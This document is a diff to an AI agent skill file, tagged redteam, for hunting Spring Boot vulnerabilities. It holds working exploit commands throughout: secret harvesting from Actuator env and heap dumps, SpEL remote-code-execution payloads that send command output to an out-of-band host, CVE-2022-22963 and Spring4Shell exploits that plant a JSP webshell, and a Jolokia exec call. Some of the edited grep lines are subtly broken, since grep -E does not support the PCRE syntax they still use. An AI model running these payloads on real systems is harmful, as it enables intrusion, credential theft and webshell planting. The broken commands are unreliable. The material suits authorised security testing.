@@ -1,8 +1,11 @@
 ---
 name: hunt-springboot
 description: Hunt Spring Boot specific vulnerabilities — Actuator endpoints (heapdump, env, loggers, mappings, shutdown), Spring Expression Language (SpEL) injection → RCE, H2 console RCE, Jolokia JMX exposure, Spring4Shell (CVE-2022-22965), Spring Cloud Function SPEL (CVE-2022-22963), heap dump credential extraction. Use when target runs Spring Boot — detected via X-Application-Context header, /actuator, Whitelabel Error Page, or Java stack traces.
-sources: hackerone_public, cve_database, spring_security_advisories
-report_count: 16
+version: 1.1.0
+revision_date: 2026-07-25
+license: MIT
+category: redteam
+tags: [springboot, hunt, redteam, java]
 ---
 
 # HUNT-SPRINGBOOT — Spring Boot Specific Vulnerabilities
@@ -25,16 +28,16 @@ Spring Boot Actuator `/actuator/heapdump` exposed = heap dump with all secrets i
 
 ```bash
 # Spring Boot indicators
-curl -sI https://$TARGET/ | grep -i "x-application-context\|x-content-type"
-curl -s "https://$TARGET/nonexistent" | grep -i "Whitelabel Error Page\|Spring Boot\|org.springframework"
+curl --max-time 30 --connect-timeout 10 -sI https://$TARGET/ | grep -i "x-application-context\|x-content-type"
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/nonexistent" | grep -i "Whitelabel Error Page\|Spring Boot\|org.springframework"
 
 # Actuator root (may list available endpoints)
-curl -s "https://$TARGET/actuator" | python3 -m json.tool 2>/dev/null
-curl -s "https://$TARGET/actuator/" | python3 -m json.tool 2>/dev/null
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/actuator" | python3 -m json.tool 2>/dev/null
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/actuator/" | python3 -m json.tool 2>/dev/null
 
 # Try common base paths
 for base in "" "/manage" "/management" "/app"; do
-  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$base/actuator")
+  STATUS=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code}" "https://$TARGET$base/actuator")
   [ "$STATUS" = "200" ] && echo "[+] Actuator at: $TARGET$base/actuator"
 done
 ```
@@ -56,21 +59,21 @@ for EP in "${ENDPOINTS[@]}"; do
   # Don't trust HTTP 200 alone — Spring returns 200 with a Whitelabel/login
   # page for many paths. Require actuator-shaped JSON (or a heapdump body)
   # before calling it EXPOSED.
-  BODY=$(curl -s -H "Accept: application/json" "$BASE/$EP")
-  CT=$(curl -s -o /dev/null -w "%{content_type}" -H "Accept: application/json" "$BASE/$EP")
+  BODY=$(curl --max-time 30 --connect-timeout 10 -s -H "Accept: application/json" "$BASE/$EP")
+  CT=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{content_type}" -H "Accept: application/json" "$BASE/$EP")
   if echo "$CT" | grep -qi "json" && ! echo "$BODY" | grep -qi "Whitelabel Error Page\|<html"; then
     echo "[+] EXPOSED: $BASE/$EP"
   fi
 done
 
 # Get environment variables (passwords, API keys)
-curl -s "$BASE/env" | python3 -m json.tool 2>/dev/null | grep -i "password\|secret\|key\|token\|credential" | head -20
+curl --max-time 30 --connect-timeout 10 -s "$BASE/env" | python3 -m json.tool 2>/dev/null | grep -i "password\|secret\|key\|token\|credential" | head -20
 
 # Get all endpoint mappings (full API surface)
-curl -s "$BASE/mappings" | python3 -m json.tool 2>/dev/null | grep -oP '"pattern":"\K[^"]+' | sort
+curl --max-time 30 --connect-timeout 10 -s "$BASE/mappings" | python3 -m json.tool 2>/dev/null | grep -Eo '"pattern":"\K[^"]+' | sort
 
 # Get Spring beans (lists all registered beans, reveals internal architecture)
-curl -s "$BASE/beans" | python3 -m json.tool 2>/dev/null | head -100
+curl --max-time 30 --connect-timeout 10 -s "$BASE/beans" | python3 -m json.tool 2>/dev/null | head -100
 ```
 
 ---
@@ -79,7 +82,7 @@ curl -s "$BASE/beans" | python3 -m json.tool 2>/dev/null | head -100
 
 ```bash
 # Download heap dump (can be large — 100MB+)
-curl -s "$BASE/heapdump" -o /tmp/heapdump.hprof
+curl --max-time 30 --connect-timeout 10 -s "$BASE/heapdump" -o /tmp/heapdump.hprof
 ls -lh /tmp/heapdump.hprof
 
 # Quick grep for secrets in heap dump (binary file — use strings)
@@ -87,10 +90,10 @@ strings /tmp/heapdump.hprof | grep -iE "(password|secret|apikey|api_key|token|be
   grep -v "^[a-z_]" | sort -u | head -50
 
 # More targeted extraction
-strings /tmp/heapdump.hprof | grep -oP "(?:password|passwd|pwd)\s*[=:]\s*\S+" | sort -u | head -20
-strings /tmp/heapdump.hprof | grep -oP "AKIA[A-Z0-9]{16}" | sort -u        # AWS keys
-strings /tmp/heapdump.hprof | grep -oP "sk_live_[A-Za-z0-9]+" | sort -u     # Stripe keys
-strings /tmp/heapdump.hprof | grep -oP "Bearer [A-Za-z0-9._-]+" | sort -u   # Bearer tokens
+strings /tmp/heapdump.hprof | grep -Eo "(?:password|passwd|pwd)\s*[=:]\s*\S+" | sort -u | head -20
+strings /tmp/heapdump.hprof | grep -Eo "AKIA[A-Z0-9]{16}" | sort -u        # AWS keys
+strings /tmp/heapdump.hprof | grep -Eo "sk_live_[A-Za-z0-9]+" | sort -u     # Stripe keys
+strings /tmp/heapdump.hprof | grep -Eo "Bearer [A-Za-z0-9._-]+" | sort -u   # Bearer tokens
 
 # Use Eclipse Memory Analyzer (MAT) for deep analysis
 # https://www.eclipse.org/mat/
@@ -102,9 +105,9 @@ strings /tmp/heapdump.hprof | grep -oP "Bearer [A-Za-z0-9._-]+" | sort -u   # Be
 
 ```bash
 # H2 console detection
-curl -s "https://$TARGET/h2-console" | grep -i "H2 Console\|H2 Database"
-curl -s "https://$TARGET/h2" | grep -i "H2 Console"
-curl -s "https://$TARGET/console" | grep -i "H2"
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/h2-console" | grep -i "H2 Console\|H2 Database"
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/h2" | grep -i "H2 Console"
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/console" | grep -i "H2"
 
 # Default credentials: sa / (empty password)
 # JDBC URL: jdbc:h2:mem:testdb
@@ -135,7 +138,7 @@ curl -s "https://$TARGET/console" | grep -i "H2"
 # - Spring WebFlow
 
 # Basic SpEL test
-curl -s -X POST "https://$TARGET/api/user/name" \
+curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/api/user/name" \
   -H "Content-Type: application/json" \
   -d '{"name": "#{7*7}"}'
 # If returns 49 → SpEL injection confirmed
@@ -143,12 +146,12 @@ curl -s -X POST "https://$TARGET/api/user/name" \
 # RCE payload — note: exec() returns a Process, not a String, so a bare
 # exec("id") produces NO visible output. Confirm via an OOB curl callback
 # (the spawned curl makes the network request even though nothing is reflected):
-curl -s -X POST "https://$TARGET/api/user/name" \
+curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/api/user/name" \
   -H "Content-Type: application/json" \
   -d '{"name": "#{T(java.lang.Runtime).getRuntime().exec(new String[]{\"sh\",\"-c\",\"curl COLLAB_HOST/spel-$(id|base64)\"})}"}'
 
 # CVE-2022-22963 — Spring Cloud Function SpEL
-curl -s -X POST "https://$TARGET/functionRouter" \
+curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/functionRouter" \
   -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"curl COLLAB_HOST/spel-rce\")" \
   -d "test"
 ```
@@ -163,12 +166,12 @@ curl -s -X POST "https://$TARGET/functionRouter" \
 # Requires: Java 9+, Tomcat as WAR deployment
 
 # Detection: does the app accept class.* parameters?
-curl -s "https://$TARGET/api/user" \
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/user" \
   -d "class.module.classLoader.URLs[0]=jar:http://COLLAB_HOST/test.jar!/"
 # Check COLLAB for HTTP callback
 
 # Exploitation: write webshell via class loader
-curl -s "https://$TARGET/login" \
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/login" \
   --data-raw "username=test&password=test&class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di+if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B+java.io.InputStream+in+%3D+Runtime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B+int+a+%3D+-1%3B+byte%5B%5D+b+%3D+new+byte%5B2048%5D%3B+while((a%3Din.read(b))!%3D-1)%7B+out.println(new+String(b))%3B+%7D+%7D+%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps%2FROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
 ```
 
@@ -178,18 +181,18 @@ curl -s "https://$TARGET/login" \
 
 ```bash
 # Jolokia provides HTTP access to JMX MBeans
-curl -s "https://$TARGET/jolokia" | python3 -m json.tool 2>/dev/null | head -20
-curl -s "https://$TARGET/actuator/jolokia" | python3 -m json.tool 2>/dev/null | head -20
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/jolokia" | python3 -m json.tool 2>/dev/null | head -20
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/actuator/jolokia" | python3 -m json.tool 2>/dev/null | head -20
 
 # List all MBeans
-curl -s "https://$TARGET/jolokia/list" | python3 -m json.tool 2>/dev/null | grep -i "type\|operation" | head -30
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/jolokia/list" | python3 -m json.tool 2>/dev/null | grep -i "type\|operation" | head -30
 
 # Read system properties via Jolokia (may expose credentials)
-curl -s "https://$TARGET/jolokia/read/java.lang:type=Runtime/SystemProperties" | \
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/jolokia/read/java.lang:type=Runtime/SystemProperties" | \
   python3 -m json.tool 2>/dev/null | grep -i "password\|secret\|key"
 
 # Exec MBean operations (potential RCE via MLet)
-curl -s "https://$TARGET/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/tmp/evil"
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/tmp/evil"
 ```
 
 ---
@@ -220,3 +223,36 @@ curl -s "https://$TARGET/jolokia/exec/com.sun.management:type=DiagnosticCommand/
 - H2 console RCE: Critical
 - Actuator env (passwords exposed): High
 - Mappings disclosure only: Low-Medium
+
+---
+
+## Verification
+
+Run this self-test to confirm springboot hunting readiness:
+
+1. **Skill integrity** — confirm the skill file is readable and well-formed:
+   ```bash
+   grep -q "name: hunt-springboot" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
+   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
+   ```
+
+2. **Category check** — confirm the skill has a category:
+   ```bash
+   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
+   ```
+
+3. **Pitfalls section** — confirm pitfalls are documented:
+   ```bash
+   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
+   ```
+
+All 3 tests verify the skill is properly structured and ready for use.
+
+---
+
+## Pitfalls
+- **Actuator endpoints without sensitive data** — `/actuator/health` or `/actuator/info` are intentionally public. Need `/actuator/env`, `/actuator/heapdump`, or `/actuator/mappings`.
+- **/actuator/env with sanitized values** — Spring Boot 2.x+ sanitizes env values by default. Need unsanitized secrets.
+- **/actuator/heapdump download** — heapdump analysis requires Eclipse MAT or similar. The finding is the dump is accessible, not what it contains (prove with actual extracted secrets).
+- **/actuator/loggers modification** — changing log level to DEBUG can leak sensitive data. Demonstrate the leaked data.
+- **Spring Boot version without CVE** — version disclosure is informational unless paired with a CVE affecting that specific version.
